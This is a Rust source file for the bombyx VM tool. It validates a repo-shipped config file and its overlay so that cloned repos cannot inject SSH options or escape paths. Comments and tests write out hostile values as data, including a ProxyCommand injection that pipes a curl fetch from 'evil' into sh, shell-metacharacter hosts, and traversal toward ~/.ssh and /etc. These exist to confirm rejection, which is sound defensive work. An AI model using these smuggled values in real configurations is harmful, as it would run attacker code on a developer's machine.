//! Project configuration (`bombyx.toml`).
//!
//! A bombyx project keeps its VM definition in the project
//! repo, not on the VM host: the repo is the source of
//! truth and the host holds only a cache. This module reads
//! that per-project configuration.
//!
//! Because `bombyx.toml` ships *inside a repo*, it is
//! attacker-controlled data the moment you clone or check out
//! someone else's branch. Every field is therefore validated
//! against an explicit allowlist rather than trusted -- see
//! `Config::validate`, which every constructor runs. Not a
//! doc link: `validate` is private, and rustdoc rejects a
//! public page pointing at a private item.

use std::path::{Component, Path, PathBuf};

use serde::Deserialize;
use thiserror::Error;

use crate::name::{ScratchName, check_segment};

/// Default directory (relative to the project root) holding
/// the Vagrantfile and provisioning scripts.
const DEFAULT_VAGRANT_DIR: &str = "vagrant";

/// Default root on the VM host under which project
/// directories are created.
const DEFAULT_REMOTE_ROOT: &str = "~/vms";

/// Largest configuration file that will be read.
///
/// Generous for a handful of keys, and small enough that a file
/// committed to a repo cannot make bombyx read it into memory
/// without bound.
const MAX_CONFIG_BYTES: u64 = 64 * 1024;

/// Errors produced while loading a project configuration.
#[derive(Debug, Error)]
pub enum ConfigError {
    /// The configuration file does not exist.
    #[error("config file not found: {}", .0.display())]
    NotFound(PathBuf),

    /// The configuration file could not be read.
    #[error("failed to read {}: {source}", .path.display())]
    Read {
        /// Path that could not be read.
        path: PathBuf,
        /// Underlying I/O error.
        source: std::io::Error,
    },

    /// A configuration path exists but is not a regular file.
    #[error("{} is not a regular file", .0.display())]
    NotAFile(PathBuf),

    /// A configuration file is implausibly large.
    #[error("{} is larger than {MAX_CONFIG_BYTES} bytes", .0.display())]
    TooLarge(PathBuf),

    /// The configuration file is not valid TOML, or does not
    /// match the expected shape.
    #[error("invalid config in {}: {source}", .path.display())]
    Parse {
        /// Path that failed to parse.
        path: PathBuf,
        /// Underlying TOML error.
        source: toml::de::Error,
    },

    /// A required field was present but empty.
    #[error("`{field}` must not be empty")]
    Empty {
        /// Name of the offending field.
        field: &'static str,
    },

    /// A field held a value outside its allowed shape.
    #[error("invalid `{field}`: {reason}")]
    Invalid {
        /// Name of the offending field.
        field: &'static str,
        /// What rule the value broke.
        reason: String,
    },
}

/// Characters allowed in an SSH destination.
///
/// Deliberately narrow: an alias from `~/.ssh/config`, or a
/// `user@host` spelling.
fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@')
}

/// Characters allowed in a path on the VM host.
fn is_remote_path_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '~')
}

/// Fewest real segments `remote_root` must contain.
///
/// One, so `<root>/<project>` is always at least two deep.
/// bombyx deletes that directory on teardown, and two segments
/// is the floor below which a configuration mistake stops being
/// recoverable: it keeps a root of `/` or `~` from making the
/// target a top-level or home-adjacent directory.
const MIN_ROOT_SEGMENTS: usize = 1;

/// The meaningful segments of a remote path.
///
/// Drops the leading `~` root marker and any empty segment left
/// by a doubled or trailing slash, so counting the result
/// measures real depth rather than characters. A `.` segment is
/// deliberately *kept*: the caller's job is to reject it, and
/// filtering it here would let `~/.` pass as depth one.
pub(crate) fn path_segments(path: &str) -> Vec<&str> {
    path.strip_prefix('~')
        .unwrap_or(path)
        .split('/')
        .filter(|s| !s.is_empty())
        .collect()
}

/// A bombyx project configuration.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Config {
    /// SSH host alias of the VM host, e.g. `frosti`.
    ///
    /// Resolved through the user's `~/.ssh/config`, so
    /// bombyx never deals with addresses or usernames.
    pub host: String,

    /// Project name. Doubles as the directory name on the
    /// VM host.
    pub project: String,

    /// Directory in the project repo holding the Vagrantfile.
    #[serde(default = "default_vagrant_dir")]
    pub vagrant_dir: String,

    /// Root directory on the VM host under which project
    /// directories are created.
    #[serde(default = "default_remote_root")]
    pub remote_root: String,
}

fn default_vagrant_dir() -> String {
    DEFAULT_VAGRANT_DIR.to_owned()
}

fn default_remote_root() -> String {
    DEFAULT_REMOTE_ROOT.to_owned()
}

/// Per-developer overrides, read from a file beside the config.
///
/// Every field is optional, so an overlay names only what
/// differs. `host` is the reason this exists: a team shares one
/// `bombyx.toml`, but each member has their own VM host, and a
/// committed file can only name one of them.
///
/// The same `deny_unknown_fields` treatment as [`Config`]: a
/// typo here must be an error rather than a setting that
/// silently does nothing.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Overlay {
    /// Replaces [`Config::host`].
    pub host: Option<String>,
    /// Replaces [`Config::project`].
    pub project: Option<String>,
    /// Replaces [`Config::vagrant_dir`].
    pub vagrant_dir: Option<String>,
    /// Replaces [`Config::remote_root`].
    pub remote_root: Option<String>,
}

/// Overwrites `dst` when the overlay supplied a value.
fn replace(dst: &mut String, src: Option<String>) {
    if let Some(value) = src {
        *dst = value;
    }
}

/// Requires a path that stays inside the project directory.
///
/// The value is joined onto the working directory, and
/// `Path::join` with an absolute operand *discards* the left
/// side -- so `vagrant_dir = "/etc"` makes `up` archive `/etc`
/// rather than a directory in the project. Since `bombyx.toml`
/// travels inside a repo, that turned a clone into
/// "tar the operator's `~/.ssh` and scp it to the host named in
/// the same file".
///
/// Rooted spellings are checked directly rather than left to
/// [`Path::is_absolute`], because that answers per-platform: a
/// Windows drive prefix is not absolute on Unix, and the same
/// config file is read on both.
fn check_project_relative(
    field: &'static str,
    value: &str,
) -> Result<(), ConfigError> {
    let invalid = |reason: &str| ConfigError::Invalid {
        field,
        reason: reason.to_owned(),
    };

    let bytes = value.as_bytes();
    if bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
        return Err(invalid("must not name a drive"));
    }
    if value.starts_with('/') || value.starts_with('\\') {
        return Err(invalid("must be relative to the project directory"));
    }
    if value.starts_with('~') {
        return Err(invalid("must not start with `~`"));
    }

    // Everything left must be an ordinary segment. This is what
    // rejects `..` and `.`, in any position rather than only at
    // the front.
    for component in Path::new(value).components() {
        if !matches!(component, Component::Normal(_)) {
            return Err(invalid(
                "must be a plain relative path, with no `.`, \
                 `..` or root",
            ));
        }
    }

    Ok(())
}

/// Deserializes TOML, naming `path` in any error.
fn from_toml<T>(source: &str, path: &Path) -> Result<T, ConfigError>
where
    T: serde::de::DeserializeOwned,
{
    toml::from_str(source).map_err(|source| ConfigError::Parse {
        path: path.to_path_buf(),
        source,
    })
}

/// Reads a config file that is allowed not to exist.
///
/// Absence is `None`. Anything else is an error rather than a
/// fallback: a config that exists but cannot be read is a
/// problem to report, not a reason to quietly send commands to
/// the host the operator meant to override.
///
/// Two refusals matter more than they look, because this path
/// is *derived* rather than named by the operator, and the file
/// it points at can come from a repo.
///
/// Anything that is not a regular file is rejected, and the
/// check is [`std::fs::symlink_metadata`] so a symlink is
/// judged as itself rather than followed. A repo can commit a
/// symlink; pointed at `~/.ssh/id_ed25519` it would make the
/// TOML parse error echo a line of the key to stderr, and
/// pointed at `/dev/zero` or a FIFO it would hang or allocate
/// without bound.
///
/// The size cap then bounds an ordinary large file, which a
/// repo can also commit.
fn read_optional(path: &Path) -> Result<Option<String>, ConfigError> {
    use std::io::Read as _;

    let meta = match std::fs::symlink_metadata(path) {
        Ok(meta) => meta,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            return Ok(None);
        }
        Err(source) => {
            return Err(ConfigError::Read {
                path: path.to_path_buf(),
                source,
            });
        }
    };

    if !meta.is_file() {
        return Err(ConfigError::NotAFile(path.to_path_buf()));
    }

    let read = |source| ConfigError::Read {
        path: path.to_path_buf(),
        source,
    };

    let file = std::fs::File::open(path).map_err(read)?;
    let mut source = String::new();
    // One byte past the cap, so a file *at* the limit is
    // accepted and anything beyond it is detectable rather than
    // silently truncated into a confusing parse error.
    file.take(MAX_CONFIG_BYTES + 1)
        .read_to_string(&mut source)
        .map_err(read)?;

    if source.len() as u64 > MAX_CONFIG_BYTES {
        return Err(ConfigError::TooLarge(path.to_path_buf()));
    }

    Ok(Some(source))
}

/// Where the overlay for `path` lives, if it can have one.
///
/// Beside the file it overrides, named `<stem>.local.toml`: the
/// original extension is *replaced*, not preserved, so
/// `staging.toml` and `staging.yaml` would share
/// `staging.local.toml`. Deriving it from the argument rather
/// than fixing one name is what makes `--config staging.toml`
/// look for `staging.local.toml`, so the override is always
/// discoverable from the file it overrides.
///
/// `None` when `path` has no file name at all -- `..`, or a
/// bare directory. Returning a path there would put the overlay
/// *beside* the directory rather than in it, which is a
/// surprise nobody asked for.
#[must_use]
pub fn local_config_path(path: &Path) -> Option<PathBuf> {
    let stem = path.file_stem()?;
    let mut name = stem.to_os_string();
    name.push(".local.toml");
    Some(path.with_file_name(name))
}

impl Config {
    /// Returns this configuration with `overlay` applied.
    ///
    /// Does not validate: the caller validates once, after
    /// merging, so an overlay cannot become the one path into
    /// the config that skips the checks the base file passes.
    #[must_use]
    pub fn with_overlay(mut self, overlay: Overlay) -> Self {
        // Destructured rather than read field by field: adding
        // a field to `Overlay` then fails to compile here,
        // instead of parsing fine and silently doing nothing.
        let Overlay {
            host,
            project,
            vagrant_dir,
            remote_root,
        } = overlay;

        replace(&mut self.host, host);
        replace(&mut self.project, project);
        replace(&mut self.vagrant_dir, vagrant_dir);
        replace(&mut self.remote_root, remote_root);
        self
    }

    /// Parses a configuration from TOML source.
    ///
    /// `path` is used only for error messages.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::Parse`] if the source is not
    /// valid TOML or carries an unknown key, and
    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] if a
    /// field fails validation.
    pub fn parse(source: &str, path: &Path) -> Result<Self, ConfigError> {
        let cfg: Self = from_toml(source, path)?;
        cfg.validate()?;
        Ok(cfg)
    }

    /// The config every module's tests use.
    ///
    /// One copy, next to the type it builds. The same four lines
    /// were written out in four test modules, so adding a required
    /// field meant four identical edits and the two literals were
    /// pinned in four places.
    #[cfg(test)]
    #[must_use]
    pub(crate) fn for_tests() -> Self {
        Self::parse(
            "host = \"frosti\"\nproject = \"phren\"\n",
            Path::new("bombyx.toml"),
        )
        .expect("the shared test config must be valid")
    }

    /// Loads a configuration from a file, and the per-developer
    /// overlay beside it.
    ///
    /// **This reads two paths, not one.** After `path`, it
    /// looks for the overlay named by [`local_config_path`] --
    /// `bombyx.toml` next to `bombyx.local.toml` -- and merges
    /// it over the file when present. The overlay is optional;
    /// one that exists but cannot be read or parsed is an error
    /// rather than a silent fallback to the committed values.
    ///
    /// Validation runs once, after the merge, so an override is
    /// subject to the same rules as the file it overrides.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::NotFound`] if `path` is absent,
    /// [`ConfigError::Read`] if either file cannot be read,
    /// [`ConfigError::NotAFile`] or [`ConfigError::TooLarge`]
    /// if either is not a plain file of sensible size,
    /// [`ConfigError::Parse`] if either is not valid TOML, and
    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] if a
    /// field fails validation after merging. The path carried
    /// by an error may be the overlay's rather than `path`.
    pub fn load(path: &Path) -> Result<Self, ConfigError> {
        // Absence is the one io error that means something
        // different for the two files, so it is mapped here
        // rather than inside the shared reader.
        let source = read_optional(path)?
            .ok_or_else(|| ConfigError::NotFound(path.to_path_buf()))?;

        let cfg: Self = from_toml(&source, path)?;

        // Validation happens once, after merging. Validating
        // the base first would let an overlay set a value the
        // base file could never carry.
        let cfg = match local_config_path(path) {
            Some(local) => match read_optional(&local)? {
                Some(source) => cfg.with_overlay(from_toml(&source, &local)?),
                None => cfg,
            },
            None => cfg,
        };

        cfg.validate()?;
        Ok(cfg)
    }

    /// Rejects values that are empty or outside their allowed
    /// shape.
    ///
    /// The `host` rules are the load-bearing ones. `host` is
    /// passed as the first positional argument to `ssh` and
    /// `scp`, and neither program honours a `--`
    /// end-of-options separator. A value starting with `-` is
    /// therefore read as an *option*, so a repo shipping
    /// `host = "-oProxyCommand=curl evil|sh"` would run code
    /// on this workstation from a bare `bombyx status` --
    /// before any network traffic. Restricting the charset
    /// closes that.
    fn validate(&self) -> Result<(), ConfigError> {
        for (field, value) in [
            ("host", &self.host),
            ("project", &self.project),
            ("vagrant_dir", &self.vagrant_dir),
            ("remote_root", &self.remote_root),
        ] {
            if value.trim().is_empty() {
                return Err(ConfigError::Empty { field });
            }
            if value.starts_with('-') {
                return Err(ConfigError::Invalid {
                    field,
                    reason: "must not start with `-`, which \
                             ssh and scp read as an option"
                        .to_owned(),
                });
            }
        }

        charset(
            "host",
            &self.host,
            is_host_char,
            "letters, \
            digits, `.`, `_`, `-` or `@`",
        )?;

        // `project` becomes one directory name on the host.
        check_segment(&self.project).map_err(|e| ConfigError::Invalid {
            field: "project",
            reason: e.to_string(),
        })?;

        // `vagrant_dir` is the one field that names a path on
        // *this* machine, so it is the one that can point the
        // archive at something outside the project.
        check_project_relative("vagrant_dir", &self.vagrant_dir)?;

        charset(
            "remote_root",
            &self.remote_root,
            is_remote_path_char,
            "letters, digits, `.`, `_`, `-`, `/` or `~`",
        )?;
        // Everything below exists because bombyx *deletes* the
        // directory it derives from `remote_root`. All of it is
        // enforced once, here, so every command agrees on which
        // roots are usable -- gating only the removal would
        // leave `up` free to extract a tarball into `/etc` while
        // teardown refused to touch it. `bombyx.toml` travels
        // inside a repo, so this is attacker-controlled input.
        //
        // The root must be anchored. An unrooted value resolves
        // against the SSH login directory, which makes the depth
        // below meaningless.
        if !(self.remote_root.starts_with('~')
            || self.remote_root.starts_with('/'))
        {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: "must start with `~` or `/`; a relative \
                         path resolves against the login \
                         directory"
                    .to_owned(),
            });
        }

        // `..` escapes the root outright. `.` is subtler and was
        // the hole in the first version of this check: it adds a
        // segment without adding depth, so `remote_root = "/."`
        // with `project = "etc"` counted as two segments deep
        // while resolving to `/etc`.
        let segments = path_segments(&self.remote_root);
        if let Some(bad) = segments.iter().find(|s| **s == "." || **s == "..") {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: format!(
                    "must not contain a `{bad}` segment; it changes \
                     where the path resolves without changing how \
                     deep it looks"
                ),
            });
        }

        if segments.len() < MIN_ROOT_SEGMENTS {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: format!(
                    "must be at least {MIN_ROOT_SEGMENTS} directory \
                     deep, so the project directory bombyx creates \
                     and deletes is not a top-level one"
                ),
            });
        }

        // A `~` is only expanded by the remote shell in
        // leading position; anywhere else it is a literal
        // character and almost certainly a mistake.
        if self
            .remote_root
            .char_indices()
            .any(|(i, c)| c == '~' && i > 0)
        {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: "`~` is only allowed as the first \
                         character"
                    .to_owned(),
            });
        }

        // `vagrant_dir` is a local path, so it must tolerate
        // Windows spellings (`infra\vm`, `C:\...`). Only
        // control characters are refused.
        if self.vagrant_dir.chars().any(char::is_control) {
            return Err(ConfigError::Invalid {
                field: "vagrant_dir",
                reason: "must not contain control characters".to_owned(),
            });
        }

        Ok(())
    }

    /// Returns the project directory on the VM host, e.g.
    /// `~/vms/phren`.
    ///
    /// A trailing slash on `remote_root` is ignored so the
    /// result never contains a doubled separator.
    #[must_use]
    pub fn remote_project_dir(&self) -> String {
        format!("{}/{}", self.root(), self.project)
    }

    /// Returns the directory on the VM host used for an
    /// ephemeral (`scratch`) VM of this project.
    ///
    /// The project name is part of the path: `scratch pr-1`
    /// in two different projects must not resolve to the same
    /// directory, or the second boot extracts one project's
    /// Vagrantfile over the other's live `.vagrant/`.
    #[must_use]
    pub fn remote_scratch_dir(&self, name: &ScratchName) -> String {
        format!("{}/scratch/{}/{name}", self.root(), self.project)
    }

    /// Returns `remote_root` without any trailing slash.
    fn root(&self) -> &str {
        self.remote_root.trim_end_matches('/')
    }
}

/// Checks every character of `value` against `allowed`.
fn charset(
    field: &'static str,
    value: &str,
    allowed: fn(char) -> bool,
    expected: &str,
) -> Result<(), ConfigError> {
    if let Some(bad) = value.chars().find(|c| !allowed(*c)) {
        return Err(ConfigError::Invalid {
            field,
            reason: format!(
                "character {bad:?} is not allowed; use only \
                 {expected}"
            ),
        });
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal() -> &'static str {
        "host = \"frosti\"\nproject = \"phren\"\n"
    }

    fn parse(source: &str) -> Result<Config, ConfigError> {
        Config::parse(source, Path::new("bombyx.toml"))
    }

    fn good() -> Config {
        parse(minimal()).unwrap()
    }

    fn scratch(name: &str) -> ScratchName {
        ScratchName::parse(name).unwrap()
    }

    #[test]
    fn parses_minimal_config_and_applies_defaults() {
        let cfg = good();
        assert_eq!(cfg.host, "frosti");
        assert_eq!(cfg.project, "phren");
        assert_eq!(cfg.vagrant_dir, "vagrant");
        assert_eq!(cfg.remote_root, "~/vms");
    }

    #[test]
    fn parses_explicit_overrides() {
        let src = "host = \"fusion\"\nproject = \"ledgerstone\"\n\
                   vagrant_dir = \"infra/vm\"\n\
                   remote_root = \"/srv/vms\"\n";
        let cfg = parse(src).unwrap();
        assert_eq!(cfg.vagrant_dir, "infra/vm");
        assert_eq!(cfg.remote_root, "/srv/vms");
    }

    #[test]
    fn rejects_a_vagrant_dir_that_escapes_the_project() {
        // `vagrant_dir` is joined onto the working directory,
        // and `Path::join` with an absolute operand *discards*
        // the left side -- so an absolute value makes `up`
        // archive that directory instead of the project's.
        // A repo shipping one of these had `bombyx up` tar the
        // operator's private keys and scp them to the host
        // named in the same file.
        //
        // The whole family, not just the case that prompted
        // the guard: two rooted spellings, a Windows drive
        // (which is *not* absolute on Unix, and the config
        // travels between platforms), a home reference, and
        // traversal in either position.
        for bad in [
            "/etc",
            "\\Windows",
            "C:/Users/igor/.ssh",
            "c:\\Users\\igor\\.ssh",
            "~/.ssh",
            "../../.ssh",
            "vagrant/../../.ssh",
            "./vagrant",
        ] {
            let src = format!(
                "host = \"h\"\nproject = \"p\"\nvagrant_dir = {bad:?}\n"
            );
            let err = parse(&src).unwrap_err();
            assert!(
                matches!(
                    err,
                    ConfigError::Invalid {
                        field: "vagrant_dir",
                        ..
                    }
                ),
                "{bad} must be rejected, got {err:?}"
            );
        }
    }

    #[test]
    fn accepts_a_relative_vagrant_dir() {
        for good in ["vagrant", "infra/vm", "a/b/c"] {
            let src = format!(
                "host = \"h\"\nproject = \"p\"\nvagrant_dir = {good:?}\n"
            );
            assert_eq!(parse(&src).unwrap().vagrant_dir, good);
        }
    }

    #[test]
    fn local_config_path_sits_beside_the_config() {
        let of = |p: &str| local_config_path(Path::new(p)).unwrap();

        assert_eq!(of("bombyx.toml"), Path::new("bombyx.local.toml"));
        assert_eq!(
            of("/repo/infra/bombyx.toml"),
            Path::new("/repo/infra/bombyx.local.toml")
        );
        // A `--config` pointing somewhere else keeps the same
        // rule, so the override is discoverable from the file
        // it overrides rather than being a fixed name.
        assert_eq!(of("staging.toml"), Path::new("staging.local.toml"));
        // The extension is replaced, not preserved. Documented
        // rather than fixed: two configs differing only by
        // extension would share one overlay.
        assert_eq!(of("staging.yaml"), Path::new("staging.local.toml"));
        assert_eq!(of("bombyx"), Path::new("bombyx.local.toml"));
    }

    #[test]
    fn overlay_replaces_only_the_fields_it_sets() {
        // The point of the file: `host` is per-developer, the
        // rest of the config is shared, so an overlay naming
        // only `host` must leave everything else alone.
        let overlay: Overlay = toml::from_str("host = \"fusion\"").unwrap();
        let cfg = good().with_overlay(overlay);
        assert_eq!(cfg.host, "fusion");
        assert_eq!(cfg.project, "phren");
        assert_eq!(cfg.vagrant_dir, "vagrant");
        assert_eq!(cfg.remote_root, "~/vms");
    }

    #[test]
    fn overlay_can_set_every_field() {
        // Every `Config` field must be overridable. This test
        // is what fails when a field is added to `Config` and
        // to `Overlay` but the two are never actually wired
        // together.
        let src = "host = \"h\"\nproject = \"p\"\n\
                   vagrant_dir = \"vm\"\nremote_root = \"/srv/v\"\n";
        let cfg = good().with_overlay(toml::from_str(src).unwrap());
        assert_eq!(cfg.host, "h");
        assert_eq!(cfg.project, "p");
        assert_eq!(cfg.vagrant_dir, "vm");
        assert_eq!(cfg.remote_root, "/srv/v");
    }

    /// Writes a base config plus an overlay, and loads them.
    ///
    /// Goes through [`Config::load`] rather than composing
    /// `with_overlay` and `validate` by hand: the order of
    /// those two is the security-relevant part, so a test that
    /// arranges the order itself would stay green if `load`
    /// stopped doing it that way.
    fn load_with_overlay(
        overlay: &str,
    ) -> (tempfile::TempDir, Result<Config, ConfigError>) {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        std::fs::write(&base, minimal()).unwrap();
        std::fs::write(dir.path().join("bombyx.local.toml"), overlay).unwrap();
        let loaded = Config::load(&base);
        (dir, loaded)
    }

    #[test]
    fn an_empty_overlay_file_changes_nothing() {
        // A developer who clears the file, rather than deleting
        // it, must get the committed configuration -- this is
        // the present-but-empty branch, which absence does not
        // exercise.
        let (_dir, loaded) = load_with_overlay("");
        assert_eq!(loaded.unwrap(), good());
    }

    #[test]
    fn an_overlay_cannot_smuggle_an_ssh_option() {
        // `host` reaches `ssh` as its first positional
        // argument, and neither ssh nor scp honours `--`, so a
        // leading `-` is read as an option. Validating before
        // merging would make the overlay the one way into the
        // config that skips that check.
        let (_dir, loaded) = load_with_overlay("host = \"-oProxyCommand=x\"");
        assert!(matches!(
            loaded.unwrap_err(),
            ConfigError::Invalid { field: "host", .. }
        ));
    }

    #[test]
    fn an_overlay_cannot_smuggle_an_escaping_vagrant_dir() {
        // The other half of the same rule, and the one with the
        // worse outcome: an absolute `vagrant_dir` makes `up`
        // archive that directory instead of the project's.
        let (_dir, loaded) = load_with_overlay("vagrant_dir = \"/etc\"");
        assert!(matches!(
            loaded.unwrap_err(),
            ConfigError::Invalid {
                field: "vagrant_dir",
                ..
            }
        ));
    }

    #[test]
    fn an_overlay_rejects_an_unknown_key() {
        // A typo must be an error rather than a setting that
        // silently does nothing -- and the message has to name
        // the overlay, since the operator has two files open
        // and only one of them is at fault.
        let (_dir, loaded) = load_with_overlay("hsot = \"x\"");
        let err = loaded.unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        let text = err.to_string();
        assert!(text.contains("bombyx.local.toml"), "{text}");
        assert!(text.contains("hsot"), "{text}");
    }

    #[test]
    fn an_overlay_that_is_not_a_regular_file_is_refused() {
        // A derived path pointing at a directory or a symlink
        // is not "no overlay": it is a state to report. A repo
        // can create either one.
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        std::fs::write(&base, minimal()).unwrap();
        std::fs::create_dir(dir.path().join("bombyx.local.toml")).unwrap();

        assert!(matches!(
            Config::load(&base).unwrap_err(),
            ConfigError::NotAFile(_)
        ));
    }

    #[test]
    fn an_oversized_config_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        // `usize::try_from` rather than `as`: the cap is a
        // `u64`, and a bare cast is a truncation waiting for a
        // 32-bit target.
        let over = usize::try_from(MAX_CONFIG_BYTES).unwrap() + 1;
        std::fs::write(&base, "#".repeat(over)).unwrap();

        assert!(matches!(
            Config::load(&base).unwrap_err(),
            ConfigError::TooLarge(_)
        ));
    }

    #[test]
    fn local_config_path_declines_a_path_with_no_file_name() {
        // `..` and a bare directory have no stem to build on,
        // and answering with a sibling path would put the
        // overlay outside the directory it belongs to.
        assert_eq!(local_config_path(Path::new("..")), None);
        assert_eq!(local_config_path(Path::new("")), None);
    }

    #[test]
    fn accepts_a_user_at_host_destination() {
        let src = "host = \"igor@frosti.local\"\nproject = \"p\"\n";
        assert_eq!(parse(src).unwrap().host, "igor@frosti.local");
    }

    #[test]
    fn rejects_invalid_toml() {
        let err = parse("host = ").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("bombyx.toml"));
    }

    #[test]
    fn rejects_missing_required_field() {
        let err = parse("host = \"frosti\"\n").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
    }

    #[test]
    fn rejects_an_unknown_key() {
        // A typo must be reported, not silently defaulted:
        // the symptom would otherwise be a push into the
        // wrong remote directory.
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrantdir = \"infra/vm\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("vagrantdir"));
    }

    #[test]
    fn rejects_empty_host() {
        let src = "host = \"\"\nproject = \"phren\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "host" }));
    }

    #[test]
    fn rejects_whitespace_only_project() {
        let src = "host = \"frosti\"\nproject = \"  \"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "project" }));
    }

    #[test]
    fn rejects_empty_vagrant_dir() {
        let src = "host = \"f\"\nproject = \"p\"\nvagrant_dir = \"\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Empty {
                field: "vagrant_dir"
            }
        ));
    }

    #[test]
    fn rejects_empty_remote_root() {
        let src = "host = \"f\"\nproject = \"p\"\nremote_root = \"\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Empty {
                field: "remote_root"
            }
        ));
    }

    #[test]
    fn rejects_a_host_that_is_an_ssh_option() {
        // The headline case: a cloned repo must not be able
        // to run code on this workstation.
        let src = "host = \"-oProxyCommand=curl evil|sh\"\n\
                   project = \"p\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Invalid { field: "host", .. }));
        assert!(err.to_string().contains("option"));
    }

    #[test]
    fn rejects_a_host_with_shell_metacharacters() {
        for host in ["a;id", "a$(id)", "a b", "a`id`", "a/b"] {
            let src = format!("host = {host:?}\nproject = \"p\"\n");
            assert!(parse(&src).is_err(), "host {host:?} must be rejected");
        }
    }

    #[test]
    fn rejects_a_remote_root_with_shell_metacharacters() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   remote_root = \"~/vms; curl evil|sh #\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "remote_root",
                ..
            }
        ));
    }

    /// Asserts `remote_root` is refused as an invalid field.
    fn assert_root_rejected(root: &str) {
        let src =
            format!("host = \"f\"\nproject = \"p\"\nremote_root = {root:?}\n");
        let err = parse(&src).unwrap_err();
        assert!(
            matches!(
                err,
                ConfigError::Invalid {
                    field: "remote_root",
                    ..
                }
            ),
            "remote_root {root:?} must be rejected, got {err}"
        );
    }

    #[test]
    fn rejects_a_traversal_segment_in_remote_root() {
        // `rm -rf` on a teardown path would otherwise escape the
        // configured root: `remote_root = "~/.."` with
        // `project = "igor"` targets the whole home directory.
        for root in ["~/..", "/srv/../..", "~/vms/../other"] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn rejects_a_single_dot_segment_in_remote_root() {
        // A `.` adds a segment without adding depth. This was
        // the hole in the first version of the guard: `"/."`
        // with `project = "etc"` looked two segments deep and
        // resolved to `/etc`.
        for root in ["/.", "~/.", "/././etc", "~/./x", "~/vms/."] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn rejects_an_unrooted_remote_root() {
        // A relative root resolves against the SSH login
        // directory, which makes the depth check meaningless.
        for root in ["..", ".", "vms", "vms/deep"] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn rejects_a_remote_root_with_no_real_depth() {
        // `/` or `~` would put the project directory -- which
        // bombyx creates, writes into, and deletes -- at the top
        // level or directly in the home directory.
        for root in ["/", "~", "~/", "//", "///"] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn accepts_rooted_remote_roots_of_real_depth() {
        // The dotted name is the important one: the check is per
        // segment, not a substring search.
        for root in ["~/vms", "~/vms.d", "/srv/vms", "/srv/vms/deep", "~/v/"] {
            let src = format!(
                "host = \"f\"\nproject = \"p\"\nremote_root = {root:?}\n"
            );
            assert!(parse(&src).is_ok(), "remote_root {root:?} must parse");
        }
    }

    #[test]
    fn path_segments_measures_depth_not_characters() {
        assert_eq!(path_segments("~/vms/phren"), vec!["vms", "phren"]);
        assert_eq!(path_segments("//x//y"), vec!["x", "y"]);
        assert_eq!(path_segments("~"), Vec::<&str>::new());
        // `.` is kept, so a caller can reject it.
        assert_eq!(path_segments("~/./x"), vec![".", "x"]);
    }

    #[test]
    fn rejects_a_non_leading_tilde_in_remote_root() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   remote_root = \"/srv/~igor\"\n";
        let err = parse(src).unwrap_err();
        assert!(err.to_string().contains("first character"));
    }

    #[test]
    fn rejects_a_project_that_is_not_one_segment() {
        let src = "host = \"f\"\nproject = \"../../etc\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "project",
                ..
            }
        ));
    }

    #[test]
    fn rejects_a_vagrant_dir_that_looks_like_a_flag() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrant_dir = \"--exclude=x\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "vagrant_dir",
                ..
            }
        ));
    }

    #[test]
    fn rejects_a_vagrant_dir_with_control_characters() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrant_dir = \"a\\nb\"\n";
        let err = parse(src).unwrap_err();
        assert!(err.to_string().contains("control characters"));
    }

    #[test]
    fn accepts_a_windows_vagrant_dir() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrant_dir = 'infra\\vm'\n";
        assert_eq!(parse(src).unwrap().vagrant_dir, r"infra\vm");
    }

    #[test]
    fn builds_remote_project_dir() {
        assert_eq!(good().remote_project_dir(), "~/vms/phren");
    }

    #[test]
    fn remote_project_dir_ignores_trailing_slash() {
